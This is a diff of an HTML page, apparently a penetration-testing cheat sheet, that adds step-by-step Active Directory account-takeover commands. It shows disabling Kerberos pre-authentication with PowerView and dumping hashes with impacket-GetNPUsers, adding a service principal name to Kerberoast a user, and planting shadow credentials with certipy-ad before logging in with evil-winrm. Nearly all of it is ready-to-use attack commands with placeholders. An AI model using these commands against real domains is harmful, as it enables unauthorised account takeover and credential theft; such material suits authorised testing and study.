@@ -45,15 +45,38 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="using-powerviewps1">Using PowerView.ps1</h3>
+<h3 id="import-powerviewps1">Import PowerView.ps1</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="py">ps1</span>
-</span></span></code></pre></div><h3 id="add-uf_dont_require_preauth-bit">Add UF_DONT_REQUIRE_PREAUTH bit</h3>
+</span></span></code></pre></div><h3 id="abuse-1--add-uf_dont_require_preauth-bit">Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Check target user</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainUser</span> <span class="n">user</span> <span class="p">|</span> <span class="nb">ConvertFrom-UACValue</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="n">user</span> <span class="n">-XOR</span> <span class="vm">@</span><span class="p">{</span><span class="n">useraccountcontrol</span><span class="p">=</span><span class="mf">4194304</span><span class="p">}</span> <span class="n">-Verbose</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainUser</span> <span class="p">&lt;</span><span class="n">target_user</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">ConvertFrom-UACValue</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Add UF_DONT_REQUIRE_PREAUTH bit</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">target_user</span><span class="p">&gt;</span> <span class="n">-XOR</span> <span class="vm">@</span><span class="p">{</span><span class="n">useraccountcontrol</span><span class="p">=</span><span class="mf">4194304</span><span class="p">}</span> <span class="n">-Verbose</span>
 </span></span></code></pre></div><h4 id="get-hash">Get hash</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In local linux machine</span>
 </span></span><span class="line"><span class="cl">impacket-GetNPUsers example.com/user -no-pass -dc-ip 10.10.11.10
+</span></span></code></pre></div><h3 id="abuse-2--kerberoasting-by-adding-spn">Abuse #2 : Kerberoasting by adding spn</h3>
+<h4 id="add-spn">Add spn</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Add spn</span>
+</span></span><span class="line"><span class="cl"><span class="n">setspn</span> <span class="n">-a</span> <span class="n">MSSQLSvc</span><span class="p">/</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="err">:</span><span class="mf">1433</span> <span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="p">\</span><span class="n">target_user</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Check</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainUser</span> <span class="n">target_user</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">serviceprincipalname</span>
+</span></span></code></pre></div><h4 id="runas">Runas</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;password&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span><span class="p">(</span><span class="s1">&#39;example.com\current_user&#39;</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-DomainSPNTicket</span> <span class="n">-SPN</span> <span class="s2">&#34;MSSQLSvc/object.local:1433&#34;</span> <span class="n">-Credential</span> <span class="nv">$Cred</span>
+</span></span></code></pre></div><h3 id="abuse-3--add-shadow-credentials">Abuse #3 : Add shadow credentials</h3>
+<h4 id="certipy-ad-from-linux">certipy-ad (From Linux)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Request a ticket</span>
+</span></span><span class="line"><span class="cl">kinit &lt;USERNAME&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Import ticket</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>/tmp/krb5cc_1000
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Pre-check (Optional)</span>
+</span></span><span class="line"><span class="cl">certipy-ad find -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -k -target &lt;TARGET_DOMAIN&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add shadow credentials</span>
+</span></span><span class="line"><span class="cl">certipy-ad shadow auto -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -account &lt;TARGET_USER&gt; -k -target &lt;TARGET_DOMAIN&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Remote with kerberos</span>
+</span></span><span class="line"><span class="cl"><span class="nv">KRB5CCNAME</span><span class="o">=</span>./&lt;TARGET_USER&gt;.ccache evil-winrm -i &lt;TARGET_DOMAIN&gt; -r &lt;DOMAIN&gt;
 </span></span></code></pre></div><br></div></div>
     
     <script src="/js/utils.js"></script>
